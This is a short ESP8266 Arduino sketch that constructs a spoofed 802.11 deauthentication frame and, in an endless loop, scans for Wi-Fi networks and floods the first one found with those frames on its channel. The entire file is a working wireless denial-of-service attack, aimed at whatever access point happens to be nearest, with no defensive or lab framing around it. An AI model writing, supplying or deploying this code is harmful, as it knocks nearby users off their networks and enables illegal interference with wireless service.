#include <ESP8266WiFi.h>

uint8_t packet[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x01, 0x00};

void deauth(uint8_t *mac, uint8_t wifi_channel)
{
    wifi_set_channel(wifi_channel);

    memcpy(&packet[10], mac, 6);
    memcpy(&packet[16], mac, 6);

    for (int i = 0; i < 100; i++)
    {
        wifi_send_pkt_freedom(packet, 26, 0);
        delay(10);
    }
}

void setup()
{
    Serial.begin(115200);
}

void loop()
{
    WiFi.scanNetworks();
    Serial.println(WiFi.SSID(0));
    deauth(WiFi.BSSID(0), WiFi.channel(0));
}